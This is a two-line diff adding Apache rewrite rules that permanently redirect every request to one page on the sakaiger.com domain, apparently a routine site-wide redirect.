@@ -1,0 +1,2 @@
+RewriteEngine on
+RewriteRule ^(.*)$ https://www.sakaiger.com/sakaicar [R=301,L]
